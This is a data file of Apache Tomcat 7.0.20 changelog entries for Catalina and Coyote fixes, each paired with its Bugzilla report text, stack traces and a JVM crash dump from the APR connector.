Catalina|Tomcat 7.0.20 (markt)|fix||In JDBCStore: Committing connection if autoCommit is false. Make sure committed connection is returned to the pool if datasource is enabled. (kfujino)|||
Catalina|Tomcat 7.0.20 (markt)|add||Split condition attribute of AccessLogValve into two, conditionIf and conditionUnless. Implement conditional logging that logs only if a request attribute is present. (kkolinko)|||
Catalina|Tomcat 7.0.20 (markt)|fix||Allow to have several AccessLogValve instances in the same scope (e.g. in the same Context). (kkolinko)|||
Catalina|Tomcat 7.0.20 (markt)|fix|51610|If an unchecked exception occurs during a lifecycle transition (e.g. web application start) ensure that the component is put into the failed state. (markt)|Context fails to reload after an error in web.xml was corrected|"With current trunk. Steps to reproduce:

1. Start Tomcat 7

2. Go to webapps/examples/WEB-INF/web.xml and uncomment <filter-mapping> for ""Timing Filter"" (line 75).

3. Wait several seconds. The examples webapp is reloaded, but fails to start. 

This happens because there is a typo. The <filter-name> value should be
s/Timing Filter/Timing filter/.

There is stack trace in the logs:

[[[
04.08.2011 8:09:39 org.apache.catalina.startup.HostConfig checkResources
WARNING: Error during context [/examples] restart
java.lang.IllegalArgumentException: Filter mapping specifies an unknown filter name Timing Filter
	at org.apache.catalina.core.StandardContext.validateFilterMap(StandardContext.java:2950)
	at org.apache.catalina.core.StandardContext.addFilterMap(StandardContext.java:2915)
	at org.apache.catalina.deploy.WebXml.configureContext(WebXml.java:1206)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1343)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:896)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:322)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5103)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.startup.HostConfig.checkResources(HostConfig.java:1279)
	at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1360)
	at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:294)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1240)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1398)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1408)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1387)
	at java.lang.Thread.run(Thread.java:662)
]]]

4. Go to web.xml and edit it once again. E.g. re-comment the mapping, or correct the typo.

5. Wait several seconds. Here is an issue:

EXPECTED: The examples webapp should reload successfully.
ACTUAL: Reload fails. The following is printed in the logs:

04.08.2011 8:09:59 org.apache.catalina.startup.HostConfig checkResources
INFO: Reloading context [/examples]
04.08.2011 8:09:59 org.apache.catalina.util.LifecycleBase start
INFO: The start() method was called on component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/examples]] after start() had already been called. The second call will be ignored.


6. Stop Tomcat. Here is the second issue:

EXPECTED: Successful shutdown
ACTUAL: 
[[[
04.08.2011 8:14:10 org.apache.catalina.startup.Catalina stop
SEVERE: Catalina.stop
org.apache.catalina.LifecycleException: An invalid Lifecycle transition was attempted ([before_stop]) for component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/examples]] in state [STARTING_PREP]
	at org.apache.catalina.util.LifecycleBase.invalidTransition(LifecycleBase.java:387)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:212)
	at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1072)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:225)
	at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1072)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:225)
	at org.apache.catalina.core.StandardService.stopInternal(StandardService.java:502)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:225)
	at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:748)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:225)
	at org.apache.catalina.startup.Catalina.stop(Catalina.java:694)
	at org.apache.catalina.startup.Catalina$CatalinaShutdownHook.run(Catalina.java:847)
]]]

This exception at shutdown happens only if examples webapp was correct when Tomcat started, but was broken afterwards. If it was already broken at startup time, nothing happens.

7. Here is the third issue: when the above happens the shutdown sequence is apparently aborted abnormally.

EXPECTED: ""INFO: Stopping ProtocolHandler [""http-bio-8080""]"" etc. messages
ACTUAL: There are no messages after the ""SEVERE: Catalina.stop"" one that I cited above."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51610
Catalina|Tomcat 7.0.20 (markt)|fix|51614|Avoid calling store.load() and session.expire() twice in PersistentManager when expiring sessions. (kfujino)|PersistentManager loads session from Store and calls session.expire() twice.|"To check whether session is loaded into  memory, StoreBase#processExpires calls findSession(id). 

=====
...
if (manager.findSession(keys[i]) != null) {
    isLoaded = true;
}
...
=====

However, PersistentManager#findSession(id) loads session from Store when there is no session in memory. 
Because session loaded from Store is an invalid session
PersistentManager logs errorlog, calls session.expire(), and deletes session from Store. 

As a result, findSession(id) returns null, and isLoaded becomes false. 
And, session.expire() is called again, and the session is deleted from Store.

If manager is PersistentManager, it is necessary to call PersistentManagerBase#isLoaded(id). 
However, to avoid regression of r1033024, other managers call findSession(id).

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51614
Catalina|Tomcat 7.0.20 (markt)|fix||Prevent spurious log warnings on container stop if a child component has previously failed. (markt)|||
Catalina|Tomcat 7.0.20 (markt)|fix||Add missing getter and setter for the alwaysUseSession attribute of the authenticators. (markt)|||
Coyote|Tomcat 7.0.20 (markt)|fix|49595|Prevent JVM crash with the AJP APR connector when flushing a closed socket. (jfclere)|Tomcat crashes in tcnative-1.dll frequently|"#
# A fatal error has been detected by the Java Runtime Environment:
#
#  EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x485a4b16, pid=2556, tid=5112
#
# JRE version: 6.0_20-b02
# Java VM: Java HotSpot(TM) Server VM (16.3-b01 mixed mode windows-x86 )
# Problematic frame:
# C  [tcnative-1.dll+0x4b16]
#
# If you would like to submit a bug report, please visit:
#   http://java.sun.com/webapps/bugreport/crash.jsp
# The crash happened outside the Java Virtual Machine in native code.
# See problematic frame for where to report the bug.
#

---------------  T H R E A D  ---------------

Current thread (0x47e3d000):  JavaThread ""ajp-8009-7"" daemon [_thread_in_native, id=5112, stack(0x4b900000,0x4b950000)]

siginfo: ExceptionCode=0xc0000005, reading address 0x00000020

Registers:
EAX=0x00000000, EBX=0x0000200e, ECX=0x00000000, EDX=0x00000000
ESP=0x4b94e800, EBP=0x4b94e818, ESI=0x00000000, EDI=0x4ae2bfe8
EIP=0x485a4b16, EFLAGS=0x00010246

Top of Stack: (sp=0x4b94e800)
0x4b94e800:   00000000 00000000 4b94e820 47e3d000
0x4b94e810:   43e67730 43e67730 4b94e860 0063a484
0x4b94e820:   0000200e 4b94e868 4ae2bfe8 00000000
0x4b94e830:   00000000 0000200e 19872b78 4b94e83c
0x4b94e840:   4b94e840 00000000 4b94e87c 43e683f0
0x4b94e850:   00000000 43e67730 00000000 4b94e870
0x4b94e860:   4b94e8a0 00632f85 43e68390 00638359
0x4b94e870:   0000200e 00000000 4ae2bfe8 00000000 

Instructions: (pc=0x485a4b16)
0x485a4b06:   55 18 51 8d 0c 16 8b 57 10 03 ca 8b 57 0c 51 52
0x485a4b16:   ff 50 20 85 c0 75 14 03 75 08 3b f3 72 d4 85 c0 


Stack: [0x4b900000,0x4b950000],  sp=0x4b94e800,  free space=13a4b94e33ck
Native frames: (J=compiled Java code, j=interpreted, Vv=VM code, C=native code)
C  [tcnative-1.dll+0x4b16]
j  org.apache.tomcat.jni.Socket.sendbb(JII)I+0
j  org.apache.coyote.ajp.AjpAprProcessor.flush()V+22
j  org.apache.coyote.ajp.AjpAprProcessor$SocketOutputBuffer.doWrite(Lorg/apache/tomcat/util/buf/ByteChunk;Lorg/apache/coyote/Response;)I+114
j  org.apache.coyote.Response.doWrite(Lorg/apache/tomcat/util/buf/ByteChunk;)V+6
j  org.apache.catalina.connector.OutputBuffer.realWriteBytes([BII)V+38
j  org.apache.tomcat.util.buf.ByteChunk.append([BII)V+202
j  org.apache.catalina.connector.OutputBuffer.writeBytes([BII)V+15
j  org.apache.catalina.connector.OutputBuffer.write([BII)V+12
j  org.apache.catalina.connector.CoyoteOutputStream.write([BII)V+7
j  org.apache.catalina.connector.CoyoteOutputStream.write([B)V+5
j  com.fisc.ptao.common.PTNative.attachmentDataPut([BZ)V+47
v  ~StubRoutines::call_stub
V  [jvm.dll+0x191d0c]
V  [jvm.dll+0x27e631]
V  [jvm.dll+0x191d8d]
V  [jvm.dll+0x19b68f]
V  [jvm.dll+0x19e487]

Java frames: (J=compiled Java code, j=interpreted, Vv=VM code)
j  org.apache.tomcat.jni.Socket.sendbb(JII)I+0
j  org.apache.coyote.ajp.AjpAprProcessor.flush()V+22
j  org.apache.coyote.ajp.AjpAprProcessor$SocketOutputBuffer.doWrite(Lorg/apache/tomcat/util/buf/ByteChunk;Lorg/apache/coyote/Response;)I+114
j  org.apache.coyote.Response.doWrite(Lorg/apache/tomcat/util/buf/ByteChunk;)V+6
j  org.apache.catalina.connector.OutputBuffer.realWriteBytes([BII)V+38
j  org.apache.tomcat.util.buf.ByteChunk.append([BII)V+202
j  org.apache.catalina.connector.OutputBuffer.writeBytes([BII)V+15
j  org.apache.catalina.connector.OutputBuffer.write([BII)V+12
j  org.apache.catalina.connector.CoyoteOutputStream.write([BII)V+7
j  org.apache.catalina.connector.CoyoteOutputStream.write([B)V+5
j  com.fisc.ptao.common.PTNative.attachmentDataPut([BZ)V+47
v  ~StubRoutines::call_stub
j  com.fisc.ptao.common.PTNative.PTReadAttachment(JLjava/lang/String;II)I+0
j  com.fisc.ptao.servlets.PTReadAttachmentServlet.doGet(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V+612
j  javax.servlet.http.HttpServlet.service(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V+35
j  javax.servlet.http.HttpServlet.service(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V+30
j  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V+376
j  org.apache.catalina.core.ApplicationFilterChain.doFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V+101
j  com.fisc.interpost.filters.LoginFilter.doFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V+361
j  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V+119
j  org.apache.catalina.core.ApplicationFilterChain.doFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V+101
j  org.apache.catalina.core.StandardWrapperValve.invoke(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V+804
j  org.apache.catalina.core.StandardContextValve.invoke(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V+365
j  org.apache.catalina.core.StandardHostValve.invoke(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V+64
j  org.apache.catalina.valves.ErrorReportValve.invoke(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V+6
j  org.apache.catalina.core.StandardEngineValve.invoke(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V+42
j  org.apache.catalina.connector.CoyoteAdapter.service(Lorg/apache/coyote/Request;Lorg/apache/coyote/Response;)V+158
j  org.apache.coyote.ajp.AjpAprProcessor.process(J)Z+309
j  org.apache.coyote.ajp.AjpAprProtocol$AjpConnectionHandler.process(J)Lorg/apache/tomcat/util/net/AprEndpoint$Handler$SocketState;+39
j  org.apache.tomcat.util.net.AprEndpoint$Worker.run()V+147
j  java.lang.Thread.run()V+11
v  ~StubRoutines::call_stub

---------------  P R O C E S S  ---------------

Java Threads: ( => current thread )
  0x48b16400 JavaThread ""ajp-8009-9"" daemon [_thread_blocked, id=5916, stack(0x4b9b0000,0x4ba00000)]
  0x4989b400 JavaThread ""ajp-8009-8"" daemon [_thread_blocked, id=5848, stack(0x4b950000,0x4b9a0000)]
=>0x47e3d000 JavaThread ""ajp-8009-7"" daemon [_thread_in_native, id=5112, stack(0x4b900000,0x4b950000)]
  0x47e75400 JavaThread ""ajp-8009-6"" daemon [_thread_blocked, id=5564, stack(0x4b7a0000,0x4b7f0000)]
  0x48fab400 JavaThread ""File Reaper"" daemon [_thread_blocked, id=4180, stack(0x4b750000,0x4b7a0000)]
  0x492a4c00 JavaThread ""ajp-8009-5"" daemon [_thread_blocked, id=2648, stack(0x4b700000,0x4b750000)]
  0x48c1a400 JavaThread ""ajp-8009-4"" daemon [_thread_in_native, id=2500, stack(0x4b660000,0x4b6b0000)]
  0x48219000 JavaThread ""ajp-8009-3"" daemon [_thread_blocked, id=5060, stack(0x4b6b0000,0x4b700000)]
  0x487f3400 JavaThread ""ajp-8009-2"" daemon [_thread_blocked, id=6028, stack(0x4b610000,0x4b660000)]
  0x49498400 JavaThread ""ajp-8009-1"" daemon [_thread_in_native, id=1396, stack(0x4b4c0000,0x4b510000)]
  0x488e5800 JavaThread ""janitorThread"" daemon [_thread_blocked, id=5976, stack(0x4b470000,0x4b4c0000)]
  0x47fbc000 JavaThread ""ajp-8009-Acceptor-0"" daemon [_thread_in_native, id=1472, stack(0x4b420000,0x4b470000)]
  0x488d2400 JavaThread ""ajp-8009-CometPoller-7"" daemon [_thread_blocked, id=5052, stack(0x4b3d0000,0x4b420000)]
  0x484c8800 JavaThread ""ajp-8009-CometPoller-6"" daemon [_thread_blocked, id=4764, stack(0x4b380000,0x4b3d0000)]
  0x48563000 JavaThread ""ajp-8009-CometPoller-5"" daemon [_thread_blocked, id=5244, stack(0x4b330000,0x4b380000)]
  0x496ca800 JavaThread ""ajp-8009-CometPoller-4"" daemon [_thread_blocked, id=1536, stack(0x4b2e0000,0x4b330000)]
  0x48c97800 JavaThread ""ajp-8009-CometPoller-3"" daemon [_thread_blocked, id=5904, stack(0x4b290000,0x4b2e0000)]
  0x48b2c400 JavaThread ""ajp-8009-CometPoller-2"" daemon [_thread_blocked, id=5092, stack(0x4b240000,0x4b290000)]
  0x4845a800 JavaThread ""ajp-8009-CometPoller-1"" daemon [_thread_blocked, id=1816, stack(0x4b1f0000,0x4b240000)]
  0x48438800 JavaThread ""ajp-8009-CometPoller-0"" daemon [_thread_blocked, id=2436, stack(0x4b1a0000,0x4b1f0000)]
  0x492c5800 JavaThread ""ajp-8009-Poller-7"" daemon [_thread_blocked, id=5536, stack(0x4b150000,0x4b1a0000)]
  0x482d2800 JavaThread ""ajp-8009-Poller-6"" daemon [_thread_blocked, id=5576, stack(0x4b100000,0x4b150000)]
  0x48c01400 JavaThread ""ajp-8009-Poller-5"" daemon [_thread_in_native, id=2456, stack(0x4b0b0000,0x4b100000)]
  0x48380400 JavaThread ""ajp-8009-Poller-4"" daemon [_thread_in_native, id=4684, stack(0x4ac60000,0x4acb0000)]
  0x48d07c00 JavaThread ""ajp-8009-Poller-3"" daemon [_thread_blocked, id=4288, stack(0x4ac10000,0x4ac60000)]
  0x4886b400 JavaThread ""ajp-8009-Poller-2"" daemon [_thread_blocked, id=2908, stack(0x4abc0000,0x4ac10000)]
  0x48be9400 JavaThread ""ajp-8009-Poller-1"" daemon [_thread_blocked, id=5208, stack(0x4ab70000,0x4abc0000)]
  0x484f6400 JavaThread ""ajp-8009-Poller-0"" daemon [_thread_blocked, id=4956, stack(0x4ab20000,0x4ab70000)]
  0x48304800 JavaThread ""http-8080-Acceptor-0"" daemon [_thread_in_native, id=5732, stack(0x4aad0000,0x4ab20000)]
  0x483fe400 JavaThread ""http-8080-Sendfile-0"" daemon [_thread_blocked, id=5412, stack(0x4aa80000,0x4aad0000)]
  0x48bb2400 JavaThread ""http-8080-CometPoller-7"" daemon [_thread_blocked, id=5056, stack(0x4aa30000,0x4aa80000)]
  0x48331400 JavaThread ""http-8080-CometPoller-6"" daemon [_thread_blocked, id=4348, stack(0x4a9e0000,0x4aa30000)]
  0x4835d400 JavaThread ""http-8080-CometPoller-5"" daemon [_thread_blocked, id=1168, stack(0x4a990000,0x4a9e0000)]
  0x48b83400 JavaThread ""http-8080-CometPoller-4"" daemon [_thread_blocked, id=5936, stack(0x4a940000,0x4a990000)]
  0x489e3800 JavaThread ""http-8080-CometPoller-3"" daemon [_thread_blocked, id=2956, stack(0x4a8f0000,0x4a940000)]
  0x48190400 JavaThread ""http-8080-CometPoller-2"" daemon [_thread_blocked, id=1860, stack(0x4a8a0000,0x4a8f0000)]
  0x49938400 JavaThread ""http-8080-CometPoller-1"" daemon [_thread_blocked, id=2180, stack(0x4a850000,0x4a8a0000)]
  0x48466400 JavaThread ""http-8080-CometPoller-0"" daemon [_thread_blocked, id=4472, stack(0x4a800000,0x4a850000)]
  0x48191400 JavaThread ""http-8080-Poller-7"" daemon [_thread_blocked, id=4952, stack(0x4a7b0000,0x4a800000)]
  0x482d1400 JavaThread ""http-8080-Poller-6"" daemon [_thread_blocked, id=6024, stack(0x4a760000,0x4a7b0000)]
  0x4854cc00 JavaThread ""http-8080-Poller-5"" daemon [_thread_blocked, id=1760, stack(0x4a510000,0x4a560000)]
  0x488ec400 JavaThread ""http-8080-Poller-4"" daemon [_thread_blocked, id=536, stack(0x4a4c0000,0x4a510000)]
  0x4857ac00 JavaThread ""http-8080-Poller-3"" daemon [_thread_blocked, id=4748, stack(0x4a470000,0x4a4c0000)]
  0x48bb2c00 JavaThread ""http-8080-Poller-2"" daemon [_thread_blocked, id=5408, stack(0x4a420000,0x4a470000)]
  0x4880f400 JavaThread ""http-8080-Poller-1"" daemon [_thread_blocked, id=6036, stack(0x4a3d0000,0x4a420000)]
  0x48006400 JavaThread ""http-8080-Poller-0"" daemon [_thread_blocked, id=2596, stack(0x4a380000,0x4a3d0000)]
  0x483a8c00 JavaThread ""ContainerBackgroundProcessor[StandardEngine[Catalina]]"" daemon [_thread_blocked, id=4516, stack(0x4a330000,0x4a380000)]
  0x48334c00 JavaThread ""SessionWorkerThread"" daemon [_thread_blocked, id=4936, stack(0x4a2e0000,0x4a330000)]
  0x4883bc00 JavaThread ""ConectionPoolMgrThread"" [_thread_blocked, id=2768, stack(0x4a290000,0x4a2e0000)]
  0x48306400 JavaThread ""LogTraceThread"" daemon [_thread_blocked, id=2988, stack(0x48fd0000,0x49020000)]
  0x48019400 JavaThread ""GC Daemon"" daemon [_thread_blocked, id=5216, stack(0x48780000,0x487d0000)]
  0x47ec2400 JavaThread ""Thread-2"" [_thread_in_native, id=2136, stack(0x48130000,0x48180000)]
  0x47e96400 JavaThread ""RMI TCP Accept-0"" daemon [_thread_in_native, id=716, stack(0x48090000,0x480e0000)]
  0x47b42800 JavaThread ""Low Memory Detector"" daemon [_thread_blocked, id=2820, stack(0x47de0000,0x47e30000)]
  0x47b40c00 JavaThread ""CompilerThread1"" daemon [_thread_blocked, id=5856, stack(0x47d90000,0x47de0000)]
  0x47b3a800 JavaThread ""CompilerThread0"" daemon [_thread_blocked, id=4260, stack(0x47d40000,0x47d90000)]
  0x47b39000 JavaThread ""Attach Listener"" daemon [_thread_blocked, id=5456, stack(0x47cf0000,0x47d40000)]
  0x47b36800 JavaThread ""Signal Dispatcher"" daemon [_thread_blocked, id=4804, stack(0x47ca0000,0x47cf0000)]
  0x47b27800 JavaThread ""Finalizer"" daemon [_thread_blocked, id=4772, stack(0x47c50000,0x47ca0000)]
  0x47b22c00 JavaThread ""Reference Handler"" daemon [_thread_blocked, id=5340, stack(0x47c00000,0x47c50000)]
  0x005f6c00 JavaThread ""main"" [_thread_in_native, id=1068, stack(0x00550000,0x005a0000)]

Other Threads:
  0x47b20000 VMThread [stack: 0x47bb0000,0x47c00000] [id=2580]
  0x47b6e400 WatcherThread [stack: 0x480e0000,0x48130000] [id=1452]

VM state:not at safepoint (normal execution)

VM Mutex/Monitor currently owned by a thread: None

Heap
 def new generation   total 39424K, used 17871K [0x036f0000, 0x061b0000, 0x18c40000)
  eden space 35072K,  50% used [0x036f0000, 0x04863f10, 0x05930000)
  from space 4352K,   0% used [0x05d70000, 0x05d70000, 0x061b0000)
  to   space 4352K,   0% used [0x05930000, 0x05930000, 0x05d70000)
 tenured generation   total 87424K, used 22368K [0x18c40000, 0x1e1a0000, 0x436f0000)
   the space 87424K,  25% used [0x18c40000, 0x1a218108, 0x1a218200, 0x1e1a0000)
 compacting perm gen  total 24064K, used 24039K [0x436f0000, 0x44e70000, 0x476f0000)
   the space 24064K,  99% used [0x436f0000, 0x44e69c68, 0x44e69e00, 0x44e70000)
No shared spaces configured.

Dynamic libraries:
0x00400000 - 0x0040f000 	C:\apache-tomcat-6.0.26\bin\tomcat6.exe
0x7c800000 - 0x7c8c0000 	C:\WINDOWS\system32\ntdll.dll
0x77e40000 - 0x77f42000 	C:\WINDOWS\system32\kernel32.dll
0x77380000 - 0x77412000 	C:\WINDOWS\system32\USER32.dll
0x77c00000 - 0x77c49000 	C:\WINDOWS\system32\GDI32.dll
0x77f50000 - 0x77fec000 	C:\WINDOWS\system32\ADVAPI32.dll
0x77c50000 - 0x77cef000 	C:\WINDOWS\system32\RPCRT4.dll
0x77ba0000 - 0x77bfa000 	C:\WINDOWS\system32\MSVCRT.dll
0x7c8d0000 - 0x7d0d4000 	C:\WINDOWS\system32\SHELL32.dll
0x77da0000 - 0x77df2000 	C:\WINDOWS\system32\SHLWAPI.dll
0x77420000 - 0x77523000 	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.3790.2778_x-ww_A8F04F11\comctl32.dll
0x6db70000 - 0x6df9c000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\server\jvm.dll
0x76aa0000 - 0x76acd000 	C:\WINDOWS\system32\WINMM.dll
0x7c360000 - 0x7c3b6000 	C:\WINDOWS\system32\MSVCR71.dll
0x6d860000 - 0x6d86c000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\verify.dll
0x6d3e0000 - 0x6d3ff000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\java.dll
0x6d340000 - 0x6d348000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\hpi.dll
0x76b70000 - 0x76b7b000 	C:\WINDOWS\system32\PSAPI.DLL
0x76f50000 - 0x76f63000 	C:\WINDOWS\system32\Secur32.dll
0x6d8a0000 - 0x6d8af000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\zip.dll
0x6d6c0000 - 0x6d6d3000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\net.dll
0x71c00000 - 0x71c17000 	C:\WINDOWS\system32\WS2_32.dll
0x71bf0000 - 0x71bf8000 	C:\WINDOWS\system32\WS2HELP.dll
0x71b20000 - 0x71b61000 	C:\WINDOWS\System32\mswsock.dll
0x76ed0000 - 0x76eff000 	C:\WINDOWS\system32\DNSAPI.dll
0x76f70000 - 0x76f77000 	C:\WINDOWS\System32\winrnr.dll
0x76f10000 - 0x76f3e000 	C:\WINDOWS\system32\WLDAP32.dll
0x76f80000 - 0x76f88000 	C:\WINDOWS\system32\rasadhlp.dll
0x6d610000 - 0x6d619000 	C:\Program Files\Java\jdk1.6.0_20\jre\bin\management.dll
0x68000000 - 0x6802f000 	C:\WINDOWS\system32\rsaenh.dll
0x5f270000 - 0x5f2c9000 	C:\WINDOWS\system32\hnetcfg.dll
0x71ae0000 - 0x71ae8000 	C:\WINDOWS\System32\wshtcpip.dll
0x485a0000 - 0x48677000 	C:\apache-tomcat-6.0.26\bin\tcnative-1.dll
0x4a070000 - 0x4a0c6000 	C:\Fischer\InterPostExpress\interpost\japi\japi.dll
0x4a0d0000 - 0x4a174000 	c:\Fischer\InterPostExpress\interpost\japi\tao40_32.dll
0x71bb0000 - 0x71bb9000 	C:\WINDOWS\system32\WSOCK32.dll
0x49040000 - 0x4904a000 	c:\Fischer\InterPostExpress\interpost\japi\IMPLODE.DLL

VM Arguments:
jvm_args: -Dcatalina.base=C:\apache-tomcat-6.0.26 -Dcatalina.home=C:\apache-tomcat-6.0.26 -Djava.endorsed.dirs=C:\apache-tomcat-6.0.26\endorsed -Djava.io.tmpdir=C:\apache-tomcat-6.0.26\temp -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.util.logging.config.file=C:\apache-tomcat-6.0.26\conf\logging.properties -Dcom.sun.management.jmxremote vfprintf -Xms128m -Xmx1024m 
java_command: <unknown>
Launcher Type: generic

Environment Variables:
JAVA_HOME=C:\Program Files\Java\jdk1.6.0_20
PATH=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\Program Files\Diskeeper Corporation\Diskeeper\;C:\Program Files\Java\jdk1.6.0_20\bin;c:\Fischer\InterPostExpress\interpost\japi;c:\Fischer\InterPostExpress\uninstall
OS=Windows_NT
PROCESSOR_IDENTIFIER=x86 Family 6 Model 15 Stepping 8, GenuineIntel



---------------  S Y S T E M  ---------------

OS: Windows Server 2003 family Build 3790 Service Pack 1

CPU:total 1 (4 cores per cpu, 1 threads per core) family 6 model 15 stepping 7, cmov, cx8, fxsr, mmx, sse, sse2, sse3, ssse3

Memory: 4k page, physical 3931596k(3039332k free), swap 5346784k(4717796k free)

vm_info: Java HotSpot(TM) Server VM (16.3-b01) for windows-x86 JRE (1.6.0_20-b02), built on Apr 12 2010 13:46:10 by ""java_re"" with MS VC++ 7.1 (VS2003)

time: Wed Jul 14 12:43:58 2010
elapsed time: 7651 seconds"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49595
Coyote|Tomcat 7.0.20 (markt)|fix|50394|Return -1 instead of throwing an exception when encountering an EOF while processing an input stream with the HTTP APR connector. (jfclere)|InternalAprInputBuffer.fill() doesn't deal correctly with EOF|"I'm using tomcat-native-1.1.20 and tomcat-6.0.29 on CentOS 5.5, and I've written a servlet that is sent large (gigabyte) streams of bytes over HTTP.

From time to time it fails with the following stacktrace:


Caused by: java.io.IOException
        at org.apache.coyote.http11.InternalAprInputBuffer.fill(InternalAprInputBuffer.java:798)
        at org.apache.coyote.http11.InternalAprInputBuffer$SocketInputBuffer.doRead(InternalAprInputBuffer.java:827)
        at org.apache.coyote.http11.filters.IdentityInputFilter.doRead(IdentityInputFilter.java:116)
        at org.apache.coyote.http11.InternalAprInputBuffer.doRead(InternalAprInputBuffer.java:738)
        at org.apache.coyote.Request.doRead(Request.java:428)
        at org.apache.catalina.connector.InputBuffer.realReadBytes(InputBuffer.java:304)
        at org.apache.tomcat.util.buf.ByteChunk.substract(ByteChunk.java:403)
        at org.apache.catalina.connector.InputBuffer.read(InputBuffer.java:327)
        at org.apache.catalina.connector.CoyoteInputStream.read(CoyoteInputStream.java:193)
        at java.io.BufferedInputStream.read1(BufferedInputStream.java:273)
        at java.io.BufferedInputStream.read(BufferedInputStream.java:334)
        at java.io.FilterInputStream.read(FilterInputStream.java:107)
[...]


Unfortunately, InternalAprInputBuffer throws away the error code on line 798, but I've run it under a debugger and nRead was -70014.

If you look in the source of apr-1.3.8 at include/apr_errno.h, you'll see this is -APR_EOF.

The bug is in the implementation of recvbb at line 892 onwards in tomcat-native-1.1.20-src/jni/native/src/network.c. Specifically, at the end of the function we check for APR_SUCCESS, and assume all other codes are an error, returning -ss. It should also check for EOF (APR_STATUS_IS_EOF), and return zero. (Or at least, InternalAprInputBuffer assumes that a return code of 0 <=> EOF).

Incidentally, apr-1.3.8/include/apr_network_io.h says in its comment on apr_socket_recv() that ""It is possible for both bytes to be received and an APR_EOF or other error to be returned."". This is a lie. All provided implementations of apr_socket_recv return with *len == 0 in case of APR_EOF."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50394
Coyote|Tomcat 7.0.20 (markt)|fix||Correctly handle a connectionTimeout value of -1 (no timeout) for the HTTP NIO and AJP NIO connectors. (markt)|||
Coyote|Tomcat 7.0.20 (markt)|fix|51503|Add additional validation that prevents a connector from starting if it does not have a port > 0. (markt)|"Additional error checking required for connector port attribute (e.g. for port="""")"|"With 7.0.18 packaged as a candidate for release and finally unreleased, when I stop the Tomcat service (only 1 war deployed), the service takes a lot of time to stop and finally was killed by system.

Having a look into the stderr log, I see it paused right after the folowing line :

INFO: Stopping ProtocolHandler [http-apr-0]

Then went into a slow loop and fill the log with these lines :

13 juil. 2011 14:30:30 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
13 juil. 2011 14:30:31 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
13 juil. 2011 14:30:32 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
etc. (about 30 times before it was killed)

I think there was no such issue with 7.0.16."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51503
